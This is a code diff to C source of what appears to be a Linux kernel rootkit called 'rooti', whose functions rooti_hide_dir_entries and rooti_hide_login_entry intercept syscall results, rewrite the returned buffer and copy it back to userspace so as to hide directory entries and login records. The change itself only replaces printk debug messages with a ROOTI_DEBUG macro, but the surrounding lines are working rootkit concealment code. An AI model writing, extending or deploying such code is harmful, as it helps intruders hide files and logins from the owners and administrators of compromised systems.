@@ -4,6 +4,7 @@
 #include <linux/kstrtox.h>
 #include "utmp.h"
 #include "hide.h"
+#include "../utils.h"
 #include "../config.h"
 
 /* 
@@ -134,14 +135,14 @@ size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, boo
     // Allocate a kernel buffer to store the data returned to user
     struct linux_dirent64 *kernel_buf = kmalloc(count, GFP_KERNEL);
     if (kernel_buf == NULL) {
-        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+        ROOTI_DEBUG("failed to allocate memory");
         return count;
     }
 
     // Copy the return data of the syscall to our kernel buffer
     int err = copy_from_user(kernel_buf, user_buf, count);
     if (err > 0) {
-        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
+        ROOTI_DEBUG("copy_from_user() failed: %d", err);
         kfree(kernel_buf);
         return count;
     }
@@ -152,7 +153,7 @@ size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, boo
     // Copy the rigged buffer back to userspace
     err = copy_to_user(user_buf, kernel_buf, count);
     if (err > 0) {
-        printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
+        ROOTI_DEBUG("copy_to_user() failed: %d", err);
     }
 
     kfree(kernel_buf);
@@ -180,14 +181,14 @@ int rooti_hide_login_entry(char *user_buf, size_t count)
     // Allocate a kernel buffer to store the data returned to user
     char *kernel_buf = kmalloc(count, GFP_KERNEL);
     if (kernel_buf == NULL) {
-        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+        ROOTI_DEBUG("failed to allocate memory");
         return -ENOMEM;
     }
 
     // Copy the results into our kernel buffer
     int err = copy_from_user(kernel_buf, user_buf, count);
     if (err > 0) {
-        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
+        ROOTI_DEBUG("copy_from_user() failed: %d", err);
         kfree(kernel_buf);
         return -EFAULT;
     }
@@ -200,7 +201,7 @@ int rooti_hide_login_entry(char *user_buf, size_t count)
         // Copy the results back to user space
         err = copy_to_user(user_buf, kernel_buf, count);
         if (err > 0) {
-            printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
+            ROOTI_DEBUG("copy_to_user() failed: %d", err);
             kfree(kernel_buf);
             return -EFAULT;
         }
